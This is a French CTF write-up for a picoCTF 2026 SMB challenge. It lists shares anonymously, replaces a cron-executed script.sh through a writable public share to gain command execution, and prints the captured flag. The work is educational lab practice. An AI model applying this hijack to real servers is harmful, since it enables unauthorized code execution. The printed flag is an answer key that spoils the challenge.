---
# Imported from Obsidian: CTF/picoCTF/picoCTF_2026/Printes share 3.md
title: Printes share 3
category: Forensics
ctf: picoCTF 2026
date: 2026-08-07
summary: On en a 2 dossiers, le shares qui est public et le secure qui est privé et nécessite une connexion avec les identifiants ce qu'on en a pas. par contre une fois connecté on voit un…
tags:
- forensics
- picoctf-2026
lang: fr
imported: true
---

### Categorie : GN 

Description :

Lister les dossiers partagés : 
```
smbclient -L //dolphin-cove.picoctf.net -p 64146 -N

```

sortie 
```
        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dolphin-cove.picoctf.net failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

On en a 2 dossiers, le shares qui est public et le secure qui est privé et nécessite une connexion avec les identifiants ce qu'on en a pas. par contre une fois connecté on voit un fichier script.sh un cron.log . Après chaque 1 min le programme exécute le fichier script.sh. on va donc le modifier et faire un RCE 

Modifier le script 
```
cat script.sh 
#!/bin/bash
id
cat /challenge/secure-shares/flag.txt > $OUTPUT/flag.txt 2>&1
#  Fixer les permissions pour être sûr de pouvoir les télécharger via SMB
chmod 666 $OUTPUT/*.txt

```

Se connecter a smb 
```
smbclient //dolphin-cove.picoctf.net/shares -p 63099 -N
```
Uploader le fichier script avec put 

```
put script.sh
```

Attendre 1 min pour que le cron tab l'exécute 

télécharger le fichier 

Flag : 
```
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_5f68e872}
```
